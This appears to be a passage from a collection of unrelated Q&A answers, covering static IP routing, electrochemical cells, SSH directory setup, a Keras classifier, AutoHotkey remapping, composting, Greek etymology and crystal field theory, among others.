there, and James can already 'see' Router A, since they're both on network 192.168.1.0. So we can just tell James to use Router A as its gateway to the 192.168.3.0 network. If James were a router instead of a computer, we'd use the command: ip route 192.168.3.0 255.255.255.0 192.168.1.1 ^ ^ ^ network mask gateway James would then be able to contact Jesus (or any host on the 192.168.3.0) network by forwarding the packet to 192.168.1.1 (Router A), which would then forward the packet to 192.168.2.2 (Router B) which would then forward the packet to its destination (Jesus in this case) via its directly connected interface. Now, for Jesus to be able to respond to James, Jesus would need to have Router B set up as its gateway to the 192.168.1.0 network, and Router B would have to have Router A set up as its gateway to the 192.168.1.0 network. Then, any host on the 192.168.1.0 network would have a path to the 192.168.3.0 network and vice versa. Hope that helps.
568524	I mean this answer as a complement to previous answers. As already disccused, in the anode you will always have an oxidation reaction $\mathrm{ \;Red\; \longrightarrow \; Ox + e^-} $, while in the cathode you will observe the reduction reaction $\mathrm{\;Red\; + e^- \longrightarrow \; Ox }$. The reduction and oxidation reactions are always coupled, so one electrode acts as a source of electrons and the other as a sink. In the galvanic cell, the overall reaction is spontaneous and the current flows from the anode to the cathode. On the other hand, in an electrolytic cell, we drive the reaction in a non-spontaneous sense applying an external potential (for example, using a power supply). I think this image should make clear the operation of both kinds of cells, the processes that occur at each electrode, and the sign convention. Although it illustrates a specific reaction, you may generalised it to other systems. The source of the image is Electrolysis I at Chemistry.LibreTexts.
726586	The important thing here is that you realize that you do need to report this information to schools to which you will be applying, as it will matter in their deliberations over your application. That said, you do have some degree of latitude in finding the best way to inform the schools of this. If they have a "special notes" or "additional information" question in the application, that might be a good place to put such information. Otherwise, you would want to mention it somewhere in the cover letter (if you get to include one) or personal statement (if you don't). However, this information should be provided by you; don't leave it for the people writing your recommendation letters to mention. That will just raise more red flags.
443733	There's a bit more information about Draco revealed in Harry Potter and the Cursed Child He had a son, Scorpius with whom he has a somewhat strained relationship. There were persistent rumours that his son was the illegitimate offspring of Voldemort. His wife died sometime during Scorpius' early childhood. Her death seems to have affected him deeply. DRACO: Astoria always knew that she was not destined for old age. She wanted me to have somebody when she left, because . . . it is exceptionally lonely, being Draco Malfoy. His wife was not a Death-Eater. His father did not approve of the match but he married her out of love. He maintained his father's collection of dark magic memorabilia.
695019	In a sense, yes, you can. As I alluded in my question here What *is* an Artificial Neural Network?, a decision tree is a neural network, lato sensu. So you can train these neural networks in parallel and combine then, with end-to-end gradient based optimization. Another way you could combine random forests is through gradient boosting. Usually, for gradient boosting, "weak" learners are combined into a "strong" learner. In random forests and bagging techniques in general, "strong", biased, learners, are combined into a, hopefully, more parsimonious model. But nothing precludes you from combining random forests in gradient boosting fashion, which answers "can I combine random Forests with an optimisation method like Gradient Descent or SGD?".
1586172	The warning means the host id has changed (from the old to the new installation). That's good! It works, letting you know it has changed... Log in as the unprivileged user (not root) and create the hidden directory, /home/jerry/.ssh: cd; mkdir .ssh; chmod 0700 .ssh At that point you can add hosts to the known_hosts file (/home/jerry/.ssh/known_hosts). Or, if you connect as guest, do the same as the user, guest, not jerry. Note that should you desire the .ssh directory to be created for all new users, then add a the .ssh directory to /etc/skel. The /etc/skel directory contains files and directories that all new users should have. sudo mkdir /etc/skel/.ssh; sudo chmod 0700 /etc/skel/.ssh Afterward, every new user you create will have a .ssh directory with the right perms (0700).
1626536	Very closely related questions have been asked before. Here are links to some of the answers: https://askubuntu.com/a/369920/248158 https://askubuntu.com/a/205447/248158 https://askubuntu.com/a/226861/248158 https://askubuntu.com/a/143406/248158 https://unix.stackexchange.com/a/25713 I like this explanation: Such messages are common with Gnome applications and do not necessarily indicate a bug. Gnome takes a dumbed-down approach to users; the intended audience won't run an application from a terminal and so won't see these messages. Redirect error output from Gnome applications to a log file if you really care, or to /dev/null otherwise. Source: Gilles. And this is also nice: This error indicates that the software is using perfectly valid GTK library calls with a newer version of the GTK library. Sometimes during software development it is desirable to get rid of the, "old way", to do things while maintaining backwards compatibility. This is accomplished by marking the undesired calls depreciated. This tells the developer that their code is perfectly valid in this release, but in the future their code will need to be updated to work with a new version of the library, possibly many releases down the road. In this case, GTK wants to be more strict about including units on dimensions. It tells the developer that GTK is assuming the units are pixels, which is the exact assumption that the software developer made in the first place. Source: Bailley S By the way, if you launch Firefox from terminal you'll may see a terrifying message like this: GLib-CRITICAL **: g_slice_set_config: assertion But it seems to be harmless as per comment in Bug #833117. In short, there's mostly no need for us beginners to launch GUI-based apps from the terminal unless there's a problem and we need to give output to someone who can understand the meaning of such output.
370105	No. Eric Sink decided that he would start a micro-ISV to create a version of solitaire that is always winnable. This was mostly just an experiment to see what it would be like running a software company with one person, but he eventually sold the product which is still available for purchase. There have been some estimates about the number of Klondike Solitaire games that are unplayable (no moves possible, about 1 in 400), and several guesses about how many games are unwinnable, although this percentage varies wildly from 30%-10%. The difficulty of this problem stems from the sheer number of initial deals 54! that would need to be evaluated to determine which were winnable and which were not.
491154	In addition to the answer above, both variants of the 50mm prime lenses (Canon & Nikon mounts) offer a huge bang for the buck. Either lens (in the f/1.8 variety) can be had for under $100, or so. I wish I still had the pictures (I do -- I just have no idea where,) but I did a direct comparison at 50mm between my Canon 24-70 f/2.8 L (~$1,200 is what I think I paid some time ago,) and my Canon 50mm f/1.8 prime (I bought this for $50 off of a for-sale board.) If I recall correctly, the 50mm f/1.8 beat the 24-70 f/2.8L out at 50mm up to f/5.6. So, with that said, if you like to shoot at 50mm (or 80mm on a 1.6x crop, etc.,) then it's a no brainer :) Good luck! Ian
849246	I used a simple Neural Network with 3 Inputs - 1 hidden layer with 8 neurons - 3 Outputs (Labels) with k-fold crossvalidation in keras for your data set. import pandas as pd from keras.models import Sequential from keras.layers import Dense from keras.wrappers.scikit_learn import KerasClassifier from keras.utils import np_utils from sklearn.model_selection import cross_val_score from sklearn.model_selection import KFold from sklearn.preprocessing import LabelEncoder, scale from sklearn.pipeline import Pipeline path = r"User\train.csv" data = pd.read_csv(path) data.location.value_counts() dataset = data.values x = dataset[:,0:3] x_scaled = scale(x) y = dataset[:,3] encoder = LabelEncoder() encoder.fit(y) encoded_Y = encoder.transform(y) dummy_y = np_utils.to_categorical(encoded_Y) def model(): model = Sequential() model.add(Dense(8, input_dim=3, activation='relu')) model.add(Dense(3, activation='softmax')) model.compile(loss='categorical_crossentropy', optimizer='adam', metrics=['accuracy']) return model estimator = KerasClassifier(build_fn=model, epochs=200, batch_size=5, verbose=0) kfold = KFold(n_splits=10, shuffle=True) results = cross_val_score(estimator, x_scaled, dummy_y, cv=kfold) print("Model Prediction: %.2f%% (%.2f%%)" % (results.mean()*100, results.std()*100)) The used Model can categorize around 94% of the data correctly. Maybe this helps for the start. Out: Prediction: 93.95% (3.13%) In data science and statistics in general you have to try and train several models to see which suits your dataset best (model benchmarking). In the end it is often a trade-off between computational costs and accuracy.
1144900	I know this is old, but this was a really infuriating change Microsoft made. I get that it is due to competing internal teams and Windows > OneNote/Office, but still... I used Win+N daily, as did a lot of people. Anyway, here's what I did to "fix the glitch": Installed AutoHotkey (Freeware scriptable key remapping software) In the default script file it creates in your Documents folder: AutoHotKey.ahk I added the following: #n::#!n That basically says: #n [Win+N] = [Win+Alt+N] Save, then hit the reload script from the tasktray menu for AutoHotkey and viola, SOLVED! Omg finally... geez that one was killin me for ages. Now reap the benefits of AutoHotkey... because holy crap that is an awesome app. I'm only 15min in, but I have already added a ton of frequently used things to it including even code blocks for when I dev Lol. I love it. Anyway, hope this helps you if still needed, and if for nothing else, the next google searcher such as myself. :)
1592398	The solution provided in this answer is yet effective for your needs even in Ubuntu 12.04. Placed here for your convenience.

2178531	In this related question, I answered: A handful of compost should be about the consistency of a damp sponge. What I do is add water when I turn the pile: I turn the hose on a little bit, set it in the spot where the pile is going to be, and start shoveling material onto it. After a couple of inches of depth, I raise the hose, so the water trickles into the center of the pile. Then shovel some more, repeatedly lifting the hose every couple inches of depth. This way, the whole height of the pile gets some moisture. If it has been hot, and we haven't had any rain, I'll also dump waste water onto the pile. (E.g. soiled water from animal buckets.)
153369	The basic meaning of the root *leǵ- was "pick out". Compare e.g., from Latin, se-lect, col-lect: to collect things is to pick them out (legō) and place them together (con-). In Greek, the development seems to have been something like "pick out (information)" > "recount" > "say". If you're telling someone a story, you start by picking out the things you want to tell them. The semantic relationship is possibly a bit clearer if you think about the noun from the same root logos, which means "verbal account": an account is a collection of information that the speaker has picked out for some communicative purpose. (The reddit thread quoted in your answer is a bit misleading in that in Greek, unlike in Latin, legō hardly ever means "read", while in Latin it doesn't mean "say": the developments in the two languages were not the same, though both senses start from the idea of "picking out".)
551193	(If you know the basics, go to last paragraph and skip the introduction part) There are two types of ligands. Strong field ligands and weak field ligands. Those which only cause a small extent of crystal field splitting is called weak field ligand and those which cause large splitting is called strong field ligand. Why does crystal field splitting take place? Let's take an octahedral complex. The $d_{x^2-y^2}$ and $d_{z^2}$ point along x,y,z axis and the $t_{2g}$ orbitals point between the axis. When the 6 ligands approach along the three axes, the energy of the $e_g$ orbitals increase more than the increase in the energy of $t_{2g}$ orbitals. Hence the d-orbital splits into two. Filling each electron in $t_{2g}$ orbitals decrease energy by $0.4\Delta_0$ and filling electrons in $e_g$ increase energy by $0.6\Delta_0$ Coming back to your question, you know how electrons are filled in the orbitals (according to hund's rule of course). But how does electron pairing take place in your case? Let the energy required to pair an electron be P. Let's say there are 4 electrons. The two arrangements are one electron in each sub-orbital (no pairing) and 4 electrons all in $t_{2g}$ itself (instead of 4th electron going to $e_g$, its paired up in $t_{2g}$). In the first case, the total energy is $-0.6\Delta_0$ and in second case, its $-1.6\Delta_0+P$. So, only strong field ligands can form the second arrangement. $P$ value is constant for a given metal ion. Finally, ammonia is weak field ligand but in certain cases, it acts as a strong field ligand (example: for Cobalt). For Fe, ammonia is a weak field ligand. Hence no pairing takes place.
2197114	If that was a photo of somewhere in the UK, the answer to your question would be that any garden belonging to the houses is behind that wall; the areas of grass between the wall and the road would be owned by a municipal Council or housing association, and not by the residents of the houses. This kind of arrangement is more common in less overcrowded areas of the UK - you wouldn't find this in London other than possibly on some housing estates, for instance, but you might well see something like it in the North or in more rural areas I can't say whether this is the explanation in the USA though, but on examining the photo again, I suspect it shows the backs of the houses, not the front.
